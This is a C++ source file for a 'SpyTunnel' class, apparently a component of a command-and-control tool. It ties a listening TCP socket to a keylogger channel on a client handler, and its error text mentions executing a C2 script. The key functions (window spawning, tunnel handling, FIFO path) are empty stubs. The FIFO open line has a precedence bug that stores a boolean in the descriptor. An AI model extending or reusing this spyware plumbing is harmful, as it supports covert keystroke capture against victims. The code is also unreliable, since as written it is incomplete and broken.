#include "spy_tunnel.hpp"
#include "client_handler.hpp"

int SpyTunnel::init(std::string* __p_ip, 
    uint __port,
    ClientHandler* __p_client,
    std::atomic<bool>* __p_shutdown_flag,
    int __connection_type
){
    p_client_ = __p_client;
    p_ip_ = __p_ip;
    port_ = __port;
    p_shutdown_flag_ = __p_shutdown_flag;
    connection_type_ = __connection_type;
    p_tunnel_fds_ = (*p_client_)[KEYLOGGER];

    tunnel_thread_ = std::thread(&SpyTunnel::run, this);

    return 0;
}

// Runs in a thread
int SpyTunnel::run() {
    pid_t pid = fork();
    if (pid < 0) {
        return -1;
    } else if (pid == 0) {
        // Child Process
        spawn_window();
        std::cerr << RED << "[Server::handle_c2] Error executing C2 script: " << strerror(errno) << RESET;
        _exit(EXIT_FAILURE);
    }

    // Parent Process
    int fifo;
    int tries = 0;
    fd_set read_fds;
    struct timeval timeout;
    int rc;
    int select_result;
    while (fifo = open(get_fifo_path(), O_WRONLY | O_NONBLOCK) < 0 && tries++<20) {
        std::this_thread::sleep_for(std::chrono::milliseconds(300));
    }
    if (fifo < 0) {
        goto cleanup;
    }

    p_tunnel_fds_->tunnel_fd_ = socket(AF_INET, connection_type_, 0);
    if (p_tunnel_fds_->tunnel_fd_ == -1) {
        goto cleanup;    
    }
    memset(&server_addr_, 0, sizeof(server_addr_));
    server_addr_.sin_family = AF_INET;
    server_addr_.sin_port = htons(port_);
    if (inet_pton(AF_INET, p_ip_->c_str(), &server_addr_.sin_addr) <= 0) {
        write_error(fifo, "Invalid IP address");
        goto cleanup;
    }

    rc = bind(p_tunnel_fds_->tunnel_fd_, (const struct sockaddr*) &server_addr_, sizeof(server_addr_));
    if (rc < 0) {
        write_error(fifo, strerror(errno));
        goto cleanup;
    }
    rc = listen(p_tunnel_fds_->tunnel_fd_, 1);
    if (rc < 0) {
        write_error(fifo, strerror(errno));
        goto cleanup;
    }

    rc = -1;
    FD_ZERO(&read_fds);
    FD_SET(p_tunnel_fds_->tunnel_fd_, &read_fds);
    timeout.tv_sec = 10;
    timeout.tv_usec = 0;
    select_result = select(p_tunnel_fds_->tunnel_fd_ + 1, &read_fds, nullptr, nullptr, &timeout);
    if (select_result > 0 && FD_ISSET(p_tunnel_fds_->tunnel_fd_, &read_fds)) {
        rc = accept(p_tunnel_fds_->tunnel_fd_, nullptr, nullptr);
        if (rc < 0) {
            write_error(fifo, strerror(errno));
            goto cleanup;
        }
    } else if (select_result == 0) {
        // Timeout 
        write_error(fifo, "Timeout waiting for connection");
        goto cleanup;
    } else {
        // An error occurred
        write_error(fifo, strerror(errno));
        goto cleanup;
    }

    handle_tunnel(rc, fifo);
    close(rc);

    cleanup:
        if (fifo >= 0) {
            close(fifo);
        }
        if (p_tunnel_fds_->tunnel_fd_ != -1) {
            close(p_tunnel_fds_->tunnel_fd_);
        }
        if (pid > 0) {
            kill(pid, SIGTERM);
            waitpid(pid, nullptr, 0);
        }
        return 0;
}

void SpyTunnel::write_error(int fifo, const std::string& __msg) {
    std::string full_error_msg = "[__error__]: " + __msg + "\n";
    write(fifo, full_error_msg.c_str(), full_error_msg.size());
}

void SpyTunnel::shutdown() {
    uint64_t u = 1;
    write(p_tunnel_fds_->shutdown_fd_, &u, sizeof(u));
    close(p_tunnel_fds_->tunnel_fd_);
    close(p_tunnel_fds_->shutdown_fd_);
    p_tunnel_fds_->tunnel_fd_ = -1;
    p_tunnel_fds_->shutdown_fd_ = -1;
    if (tunnel_thread_.joinable()) {
        tunnel_thread_.join();
    }
}

void SpyTunnel::spawn_window() {
}

void SpyTunnel::handle_tunnel(int __socket, int __fifo_fd) {
}

const char* SpyTunnel::get_fifo_path() {
    // Return a default value or implement as needed
    return nullptr;
}
SpyTunnel::~SpyTunnel() = default;